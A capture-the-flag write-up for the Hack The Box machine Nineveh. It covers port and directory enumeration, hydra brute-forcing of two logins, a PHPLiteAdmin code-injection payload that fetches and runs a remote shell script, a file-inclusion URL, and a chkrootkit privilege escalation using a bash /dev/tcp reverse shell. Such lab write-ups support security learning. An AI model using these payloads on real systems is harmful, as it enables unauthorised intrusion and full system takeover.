# HTB Medium Box Nineveh  

## Enumeration Stage:

Let's start with an nmap scan
```
# Nmap 7.92 scan initiated Mon May  9 21:31:55 2022 as: nmap -sC -sV -A -o nmap 10.10.10.43
Nmap scan report for 10.10.10.43
Host is up (0.022s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1
```

Looks like this is going to be a web vuln... let's try to find some hidden directories.

`gobuster dir -u http://10.10.10.43 -w /usr/share/dirb/wordlists/big.txt   `

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.43
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/09 22:12:45 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/department           (Status: 301) [Size: 315] [--> http://10.10.10.43/department/]
/server-status        (Status: 403) [Size: 299]                                     
                                                                                    
===============================================================
2022/05/09 22:14:16 Finished
===============================================================
                                                                                                  

```
`gobuster dir -u https://10.10.10.43 -w /usr/share/dirb/wordlists/big.txt -k`
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.43
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/09 22:17:01 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 296]
/db                   (Status: 301) [Size: 309] [--> https://10.10.10.43/db/]
/server-status        (Status: 403) [Size: 300]                              
                                                                             
===============================================================
2022/05/09 22:18:14 Finished
===============================================================

```

2 Interesting directories, /department on the http and /db on the https side

Let's check out the /department first

It prompts for a username and password, try bruteforcing admin with hydra?
`hydra -l admin -P /home/kali/freqFiles/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:F=Invalid" `

Bingo! Running this yields a username and password: 

```
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
```

Logging in brings us to a page with the following information:
```
Have you fixed the login page yet! hardcoded username and password is really bad idea!

check your serect folder to get in! figure it out! this is your challenge

Improve the db interface.
~amrois

```
We have a username and a hint   

## Exploit

Time to go check in the /db on the https site.
This brings us to a phpLite 1.9.3 Login page. Quick search on searchsploit shows an authenticated code injection
```PHPLiteAdmin 1.9.3 - Remote PHP Code Injection            | php/webapps/24044.txt```

The same password does not work and With no hints for the username, it's time for hydra again.
`hydra -l admin -P /home/kali/freqFiles/rockyou.txt 10.10.10.43 -S http-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:F=Incorrect" `

Hydra for the win again!
```[443][http-post-form] host: 10.10.10.43   login: admin   password: password123 ```

After logging in, it looks like we can execute the RCE vulnerability.
Entering the following as the payload. We need to find a way to reach /var/tmp/final.php
`<?php system("wget http://10.10.14.48:8000/rev-shell.php -O /tmp/final.php; php /tmp/final.php"); ?>`

Just remembering the notes, page, maybe we can lfi to final.php
`http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/final.php`

This works and after setting up a netcat listener, we get shell.

After we get shell as www-data, it is time to privesc.

## Privesc

There is a /reports directory owned by the user amrois. It looks like there's a cronjob running and creating text files of scans performed by chkrootkit

Searchsploit for chkrootkit yields:
```Chkrootkit 0.49 - Local Privilege Escalation              | linux/local/33899.txt```

Following this, I placed a file named update in /tmp with the contents:
`
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.48/9999 0>&1
`

Started a listener on my local machine and got shell as root
